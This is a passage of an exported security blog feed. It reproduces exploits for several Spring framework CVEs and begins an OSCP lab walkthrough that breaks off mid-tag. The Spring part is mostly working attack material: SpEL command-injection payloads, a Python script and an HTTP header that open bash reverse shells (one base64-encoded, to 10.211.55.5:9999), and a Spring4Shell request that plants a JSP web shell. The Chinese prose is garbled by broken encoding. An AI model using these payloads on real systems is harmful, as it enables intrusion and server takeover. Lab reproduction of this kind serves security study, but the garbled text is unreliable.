&#x27;destination&#x27;: subscribe_dest</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    data = json.dumps(&#123;&#x27;name&#x27;: &#x27;vulhub&#x27;&#125;)</span><br><span class="line">    sockjs.send(&#x27;send&#x27;, &#123;</span><br><span class="line">        &#x27;content-length&#x27;: len(data),</span><br><span class="line">        &#x27;destination&#x27;: send_dest</span><br><span class="line">    &#125;, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;http://1:8080/gs-guide-websocket&#x27;</span><br><span class="line">    subscribe_dest = &#x27;/topic/greetings&#x27;</span><br><span class="line">    send_dest = &#x27;/app/hello&#x27;</span><br><span class="line">    lhost = &#x27;127.0.0.1&#x27;</span><br><span class="line">    lport = &#x27;9999&#x27;</span><br><span class="line">    command = base64.b64encode(&#x27;bash -i &gt;&amp; /dev/tcp/&#123;&#125;/&#123;&#125; 0&gt;&amp;1&#x27;.format(lhost,lport).encode(&#x27;utf-8&#x27;))</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="äº”ã€Spring-Data-Commons-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1273ï¼‰"><a href="#äº”ã€Spring-Data-Commons-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1273ï¼‰" class="headerlink" title="äº”ã€Spring Data Commons è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1273ï¼‰"></a>äº”ã€Spring Data Commons è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-1273ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -4"><a href="#1ã€æ¼æ´åŸå› -4" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Spring Dataæ˜¯ä¸€ä¸ªç”¨äºç®€åŒ–æ•°æ®åº“è®¿é—®ï¼Œå¹¶æ”¯æŒäº‘æœåŠ¡çš„å¼€æºæ¡†æ¶ï¼ŒSpring Data Commonsæ˜¯Spring Dataä¸‹æ‰€æœ‰å­é¡¹ç›®å…±äº«çš„åŸºç¡€æ¡†æ¶ã€‚Spring Data Commons åœ¨2.0.5åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€å¤„SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¶æ„SpELè¡¨è¾¾å¼ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-4"><a href="#2ã€å½±å“ç‰ˆæœ¬-4" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><ul><li>Spring Data Commons 1.13 åˆ° 1.13.10 </li><li>Spring Data Commons 2.0 åˆ° 2.0.5</li></ul><h3 id="3ã€æ¼æ´å¤ç°-4"><a href="#3ã€æ¼æ´å¤ç°-4" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€é¦–é¡µ</p><img src="/img/VulnRep-Spring/image-20240523161850728.png" alt="image-20240523161850728" style="zoom:150%;" /><p>2ã€æ¼æ´ç‚¹æ³¨å†Œé¡µé¢<code>/users</code></p><p><img src="/img/VulnRep-Spring/image-20240523161933560.png" alt="image-20240523161933560"></p><p>3ã€æ¼æ´å¤ç°</p><p>æ³¨å†Œå¹¶æŠ“åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/1.txt&quot;)]</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523162044363.png" alt="image-20240523162044363"></p><p>å†™å…¥æˆåŠŸ</p><p><img src="/img/VulnRep-Spring/image-20240523162203362.png" alt="image-20240523162203362"></p><h2 id="å…­ã€Spring-Cloud-Gateway-Actuator-API-SpELè¡¨è¾¾å¼æ³¨å…¥å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-22947ï¼‰"><a href="#å…­ã€Spring-Cloud-Gateway-Actuator-API-SpELè¡¨è¾¾å¼æ³¨å…¥å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-22947ï¼‰" class="headerlink" title="å…­ã€Spring Cloud Gateway Actuator API SpELè¡¨è¾¾å¼æ³¨å…¥å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-22947ï¼‰"></a>å…­ã€Spring Cloud Gateway Actuator API SpELè¡¨è¾¾å¼æ³¨å…¥å‘½ä»¤æ‰§è¡Œï¼ˆCVE-2022-22947ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -5"><a href="#1ã€æ¼æ´åŸå› -5" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Spring Cloud Gatewayæ˜¯Springä¸­çš„ä¸€ä¸ªAPIç½‘å…³ã€‚å…¶3.1.0åŠ3.0.6ç‰ˆæœ¬ï¼ˆåŒ…å«ï¼‰ä»¥å‰å­˜åœ¨ä¸€å¤„SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œå½“æ”»å‡»è€…å¯ä»¥è®¿é—®Actuator APIçš„æƒ…å†µä¸‹ï¼Œå°†å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-5"><a href="#2ã€å½±å“ç‰ˆæœ¬-5" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><ul><li>Spring Cloud Gateway 3.1.x &lt; 3.1.1</li><li>Spring Cloud Gateway 3.0.x &lt; 3.0.7</li><li>æ—§çš„ã€ä¸å—æ”¯æŒçš„ç‰ˆæœ¬ä¹Ÿä¼šå—åˆ°å½±å“</li></ul><h3 id="3ã€æ¼æ´å¤ç°-5"><a href="#3ã€æ¼æ´å¤ç°-5" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€é¦–é¡µ</p><img src="/img/VulnRep-Spring/image-20240523165110802.png" alt="image-20240523165110802" style="zoom:150%;" /><p>2ã€æ·»åŠ ä¸€ä¸ªæ¶æ„è¯·æ±‚çš„è·¯ç”±ã€‚POSTè¯·æ±‚<code>/actuator/gateway/routes/pentest</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: xx.xx.xxx.xx:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like     Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;hacktest&quot;,</span><br><span class="line"> &quot;filters&quot;: [&#123;</span><br><span class="line">&quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">&quot;args&quot;: &#123;</span><br><span class="line">  &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">  &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523165722503.png" alt="image-20240523165722503"></p><p>3ã€åˆ·æ–°è·¯ç”±ï¼Œè§¦å‘è¡¨è¾¾å¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: 192.168.32.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523165843602.png" alt="image-20240523165843602"></p><p>4ã€æŸ¥çœ‹å›æ˜¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 192.168.32.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523171313927.png" alt="image-20240523171313927"></p><p>5ã€åˆ é™¤è·¯ç”±</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DELETE /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 192.168.32.130:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="ä¸ƒã€Spring-Cloud-Function-SpELè¡¨è¾¾å¼å‘½ä»¤æ³¨å…¥ï¼ˆCVE-2022-22963ï¼‰"><a href="#ä¸ƒã€Spring-Cloud-Function-SpELè¡¨è¾¾å¼å‘½ä»¤æ³¨å…¥ï¼ˆCVE-2022-22963ï¼‰" class="headerlink" title="ä¸ƒã€Spring Cloud Function SpELè¡¨è¾¾å¼å‘½ä»¤æ³¨å…¥ï¼ˆCVE-2022-22963ï¼‰"></a>ä¸ƒã€Spring Cloud Function SpELè¡¨è¾¾å¼å‘½ä»¤æ³¨å…¥ï¼ˆCVE-2022-22963ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -6"><a href="#1ã€æ¼æ´åŸå› -6" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>Spring Cloud Function æä¾›äº†ä¸€ä¸ªé€šç”¨çš„æ¨¡å‹ï¼Œç”¨äºåœ¨å„ç§å¹³å°ä¸Šéƒ¨ç½²åŸºäºå‡½æ•°çš„è½¯ä»¶ï¼ŒåŒ…æ‹¬åƒ Amazon AWS Lambda è¿™æ ·çš„ FaaSï¼ˆå‡½æ•°å³æœåŠ¡ï¼Œfunction as a serviceï¼‰å¹³å°ã€‚</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-6"><a href="#2ã€å½±å“ç‰ˆæœ¬-6" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><ul><li>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</li></ul><h3 id="3ã€æ¼æ´å¤ç°-6"><a href="#3ã€æ¼æ´å¤ç°-6" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>post è¯·æ±‚<code>/functionRouter</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: xx.xx.xx.xx:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1687934495</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;touch /tmp/1.txt&quot;)</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/VulnRep-Spring/image-20240523180738617.png" alt="image-20240523180738617"></p><p>åå¼¹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /functionRouter HTTP/1.1</span><br><span class="line">Host: xx.xx.x.xx:8080</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1687934495</span><br><span class="line">Connection: close</span><br><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuNS85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="å…«ã€Springæ¡†æ¶Data-Bindingä¸JDK-9-å¯¼è‡´çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-22965ï¼‰"><a href="#å…«ã€Springæ¡†æ¶Data-Bindingä¸JDK-9-å¯¼è‡´çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-22965ï¼‰" class="headerlink" title="å…«ã€Springæ¡†æ¶Data Bindingä¸JDK 9+å¯¼è‡´çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-22965ï¼‰"></a>å…«ã€Springæ¡†æ¶Data Bindingä¸JDK 9+å¯¼è‡´çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-22965ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› -7"><a href="#1ã€æ¼æ´åŸå› -7" class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p>åœ¨JDK 9+ä¸Šè¿è¡Œçš„Spring MVCæˆ–Spring WebFluxåº”ç”¨ç¨‹åºå¯èƒ½å­˜åœ¨é€šè¿‡æ•°æ®ç»‘å®šæ‰§è¡Œè¿œç¨‹ä»£ç ï¼ˆRCEï¼‰çš„æ¼æ´ã€‚ç°åœ¨å·²çŸ¥çš„åˆ©ç”¨æ–¹æ³•è¦æ±‚åº”ç”¨ç¨‹åºä»¥WARéƒ¨ç½²çš„å½¢å¼åœ¨Tomcatä¸Šè¿è¡Œã€‚</p><p>ç„¶è€Œï¼Œè¯¥æ¼æ´çš„æ€§è´¨æ›´ä¸ºæ™®éï¼Œå¯èƒ½æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥åˆ©ç”¨å®ƒã€‚å¯ä¿®æ”¹tomcat æ—¥å¿—å­˜å‚¨è·¯å¾„ä¸åç¼€ï¼Œå‘æ—¥å¿—ä¸­å†™å…¥jsp</p><h3 id="2ã€å½±å“ç‰ˆæœ¬-7"><a href="#2ã€å½±å“ç‰ˆæœ¬-7" class="headerlink" title="2ã€å½±å“ç‰ˆæœ¬"></a>2ã€å½±å“ç‰ˆæœ¬</h3><ul><li>Spring Framework ç‰ˆæœ¬ 5.3.0 åˆ° 5.3.17ã€5.2.0 åˆ° 5.2.19 ä»¥åŠæ›´æ—©çš„ç‰ˆæœ¬</li></ul><h3 id="3ã€æ¼æ´å¤ç°-7"><a href="#3ã€æ¼æ´å¤ç°-7" class="headerlink" title="3ã€æ¼æ´å¤ç°"></a>3ã€æ¼æ´å¤ç°</h3><p>1ã€é¦–é¡µ</p><img src="/img/VulnRep-Spring/image-20240523193634539.png" alt="image-20240523193634539" style="zoom:150%;" /><p>2ã€æ·»åŠ å‚æ•°ï¼š<code>name=admin&amp;age=123</code></p><img src="/img/VulnRep-Spring/image-20240523193724442.png" alt="image-20240523193724442" style="zoom:150%;" /><p>3ã€ä¸Špoc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</span><br><span class="line">Host: xx.x.x.x:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">suffix: %&gt;//</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1687934495; JSESSIONID=CF57B4777BD071833A15E58A4845A84D</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯¥pocæ”¹å˜Tomcat æ—¥å¿—ä¸º&#96;&#96;tomcatwar.jsp&#96;ï¼Œå¦‚ä¸‹æ‰§è¡Œå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.xx.x.x:8080/tomcatwar.jsp?pwd=j&amp;cmd=id</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å¤ç°ä¸å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Springç³»åˆ— </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€OSCPç³»åˆ—ã€‘OSCPé¶æœº-cybersploit</title>
      <link href="/2024/05/22/OSCP-cybersploit/"/>
      <url>/2024/05/22/OSCP-cybersploit/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCPç³»åˆ—é¶æœºâ€”Cybersploit"><a href="#OSCPç³»åˆ—é¶æœºâ€”Cybersploit" class="headerlink" title="OSCPç³»åˆ—é¶æœºâ€”Cybersploit"></a>OSCPç³»åˆ—é¶æœºâ€”Cybersploit</h1><h2 id="ä¸€ã€ä¸»æœºå‘ç°"><a href="#ä¸€ã€ä¸»æœºå‘ç°" class="headerlink" title="ä¸€ã€ä¸»æœºå‘ç°"></a>ä¸€ã€ä¸»æœºå‘ç°</h2><p><img src="/img/OSCP-cybersploit/image-20240522183039941.png" alt="image-20240522183039941"></p><h2 id="äºŒã€ç«¯å£æ‰«æ"><a href="#äºŒã€ç«¯å£æ‰«æ" class="headerlink" title="äºŒã€ç«¯å£æ‰«æ"></a>äºŒã€ç«¯å£æ‰«æ</h2><h3 id="1ã€å¿«é€Ÿæ‰«æ"><a href="#1ã€å¿«é€Ÿæ‰«æ" class="headerlink" title="1ã€å¿«é€Ÿæ‰«æ"></a>1ã€å¿«é€Ÿæ‰«æ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -F 192.168.31.51</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522183112195.png" alt="image-20240522183112195"></p><h3 id="2ã€å…¨ç«¯å£æ‰«æ"><a href="#2ã€å…¨ç«¯å£æ‰«æ" class="headerlink" title="2ã€å…¨ç«¯å£æ‰«æ"></a>2ã€å…¨ç«¯å£æ‰«æ</h3><p><img src="/img/OSCP-cybersploit/image-20240522183344280.png" alt="image-20240522183344280"></p><h3 id="3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«"><a href="#3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«" class="headerlink" title="3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«"></a>3ã€æœåŠ¡ç‰ˆæœ¬è¯†åˆ«</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe -sV -sT -sC -O -p22,80 192.168.31.51</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522183355717.png" alt="image-20240522183355717"></p><h3 id="4ã€æ¼æ´æ¢æµ‹"><a href="#4ã€æ¼æ´æ¢æµ‹" class="headerlink" title="4ã€æ¼æ´æ¢æµ‹"></a>4ã€æ¼æ´æ¢æµ‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap.exe --script=vuln -p22,80 192.168.31.51</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522183633494.png" alt="image-20240522183633494"></p><p>å­˜åœ¨robots.txt æ–‡ä»¶</p><h2 id="ä¸‰ã€HTTP-ä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€HTTP-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€HTTP ä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€HTTP ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€robots-txt-æ–‡ä»¶"><a href="#1ã€robots-txt-æ–‡ä»¶" class="headerlink" title="1ã€robots.txt æ–‡ä»¶"></a>1ã€robots.txt æ–‡ä»¶</h3><p><img src="/img/OSCP-cybersploit/image-20240522183710155.png" alt="image-20240522183710155"></p><p>base64è§£ç ï¼Œå¾—åˆ°flag1ï¼Œè¿™ä¸ªflag1çš„å†…å®¹ä¼¼ä¹æŒ‡å‘ä¸€ä¸ªç½‘é¡µ</p><p><img src="/img/OSCP-cybersploit/image-20240522183915085.png" alt="image-20240522183915085"></p><h3 id="2ã€é¡µé¢æºä»£ç "><a href="#2ã€é¡µé¢æºä»£ç " class="headerlink" title="2ã€é¡µé¢æºä»£ç "></a>2ã€é¡µé¢æºä»£ç </h3><p>æœ‰ä¸€å¼ <code>hacker.gif</code>çš„å›¾ç‰‡å’Œä¸€ä¸ªè´¦å·åï¼š<code>itsskv</code></p><p><img src="/img/OSCP-cybersploit/image-20240522184607957.png" alt="image-20240522184607957"></p><h2 id="å››ã€getshell"><a href="#å››ã€getshell" class="headerlink" title="å››ã€getshell"></a>å››ã€getshell</h2><p>åé¢å¯¹<code>hacker.gif</code>åšäº†å¤„ç†ï¼Œæ²¡æœ‰ç»“æœï¼Œåˆ°è¿™é‡Œé™·å…¥äº†åƒµå±€ã€‚</p><p>çœ‹ä½¬çš„æ–‡ç« è¯´ï¼Œflag1çš„å†…å®¹å°±æ˜¯è¯¥ç”¨æˆ·åçš„å¯†ç ã€‚</p><p>ã€‚ã€‚ã€‚æ­£å¸¸äººè°ä¼šè¿™ä¹ˆæƒ³ï¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh itsskv@192.168.31.51</span><br><span class="line"></span><br><span class="line">//å¯†ç ï¼šcybersploit&#123;youtube.com/c/cybersploit&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-cybersploit/image-20240522190320913.png" alt="image-20240522190320913"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><h3 id="1ã€æŸ¥çœ‹-etc-passwdæ–‡ä»¶"><a href="#1ã€æŸ¥çœ‹-etc-passwdæ–‡ä»¶" class="headerlink" title="1ã€æŸ¥çœ‹&#x2F;etc&#x2F;passwdæ–‡ä»¶"></a>1ã€æŸ¥çœ‹&#x2F;etc&#x2F;passwdæ–‡ä»¶</h3><p>æŸ¥çœ‹<code>/etc/passwd</code>å‘ç°è¿˜å­˜åœ¨ä¸€ä¸ª<code>cybersploit</code>çš„ç”¨æˆ·ï¼Œå—¯ã€‚ã€‚ã€‚</p><p><img src="/img/OSCP-cybersploit/image-20240522190539935.png" alt="image-20240522190539935"></p><h3 id="2ã€flag2-txt-æ–‡ä»¶"><a href="#2ã€flag2-txt-æ–‡ä»¶" class="headerlink" title="2ã€flag2.txt æ–‡ä»¶"></a>2ã€flag2.txt æ–‡ä»¶</h3><p>æœ‰ä¸€ä¸ªflag2.txt æ–‡ä»¶</p><p><img src="/img/OSCP-cybersploit/image-20240522190839543.png" alt="image-20240522190839543"></p><p><img src="/img/OSCP-cybersploit/image-20240522190833796.png" alt="image-20240522190833796"></p><p>é«˜ä½å¾—ç»™<code>cybersploit</code>ç”¨æˆ·å°è¯•ä¸‹</p><p><img src="/img/OSCP-cybersploit/image-20240522191006392.png" alt="image-20240522191006392"></p><p>å¤±è´¥äº†</p><h3 id="3ã€æƒé™æå‡"><a href="#3ã€æƒé™æå‡" class="headerlink" title="3ã€æƒé™æå‡"></a>3ã€æƒé™æå‡</h3><p>æ™®é€šææƒæ–¹å¼çš„æ¡ä»¶éƒ½æ²¡è¾¾åˆ°ï¼Œåªèƒ½æ‹¿å‡ºå†…æ ¸ææƒå’Œææƒå·¥å…·ã€‚å°è¯•å†…æ ¸ææƒï¼Œå†…æ ¸ç‰ˆæœ¬<code>3.13.0</code></p><p>ä¸€çœ¼å°±ç›¸ä¸­è¿™ä¿©äº†</p><p><img 